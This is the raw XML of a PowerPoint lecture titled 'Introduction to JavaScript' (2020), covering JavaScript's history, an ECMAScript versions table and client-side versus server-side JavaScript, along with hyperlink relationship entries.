Target="http://docs.jquery.com/Ajax/jQuery.ajax" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.jquery.com/category/ajax/" TargetMode="Externa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8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Cascading_Style_Sheets" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/GUI_widget" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Library_(computing)" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://jqueryui.com/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/JavaScript" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Libscore" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/JQuery" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/JQuery_UI#cite_note-4" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Theme_(computing)" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/HTML" TargetMode="External"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide220.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://themeroller.jquerymobile.com/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jquerymobil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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF2230C9-37FA-48AA-BA0F-9625598D0262}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Introduction to JavaScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Alaotsikko 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{727CE5E3-1411-41C4-8A2D-54703750124A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>by Petri Kuittinen 2020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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F5623EB-09D2-42BA-8339-672A3D4DC96A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA8AB583-2E63-4C61-99A4-F47FC08463C4}"/>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dirty="0"/>
              <a:t>an interpreted dynamically-typed programming language</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>prototype-based object-oriented programming</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>originally developed by Brendan Eich of Netscape under the name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Mocha</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, later renamed to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>LiveScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and then </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>JavaScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>for marketing reasons</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Netscape 2.0 (March 1996) was the 1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0"/>
              <a:t>st</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> browser to have JavaScript. Nowadays all major browsers have JavaScript support built-in. It can be disabled though.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Microsoft </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> was the same language with minor differences in application programming interface (API)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>ECMAScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> standard </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>ECMA-262</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>version 3 = JavaScript 1.5 or JScript 5.5 or newer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CFAEFC31-5F92-42FD-BAD2-ED6D84A4CBC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>ECMAScript Versions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Content Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{59468778-5BFB-43A3-BA28-6197E923BE68}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3108724256"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609602" y="1196753"/>
          <a:ext cx="10972798" cy="5274907"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1208867">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2789694">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="6974237">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20002"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="393752">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Name</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="393752">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>1</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>ECMAScript 1 (1997)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>First Edition</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="393752">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>3</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>ECMAScript 3 (1999)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Added regular expressions and try-catch</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="393752">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>5</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>ECMAScript 5 (2009)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Added "strict mode", JSON support, String.trim()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="970896">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>6</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>ECMAScript 6 (2015)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Added let, const, class, constructor, default parameters, for of, promises, template literals, destructuring, generators, Symbol, Map, Set</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="393752">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>7</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>ECMAScript 2016</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Exponentiation operator **, Array.includes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="679626">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>8</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>ECMAScript 2017</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>String.padStart, String.padEnd, Object.entries, async/await, trailing commas </a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="393752">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>9</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>ECMAScript 2018</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Regexp named groups, rest operator …, shared memory</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="621777">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>10</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>ECMAScript 2019</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Array.flat, String.trimStart, String.trimEnd, optional catch binding</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="621777">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>11</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>ECMAScript 2020</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>BigInt</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>, dynamic imports, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>nullish</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t> coalescing operator (??), </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>globalThis</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>String.matchAll</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91433" marR="91433" marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="172733108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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9515CB38-645D-448A-B55C-A3FB2F7813F2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Client-side (Frontend) vs. Server-side (Backend)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4601206E-9A16-43C0-A752-95C3A23746CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript run in the web-browser is called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>client-side JavaScript</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>for security reasons you cannot do anything with the local file system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript run elsewhere, especially on server, is often called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>server-side JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or backend on web development.</a:t>
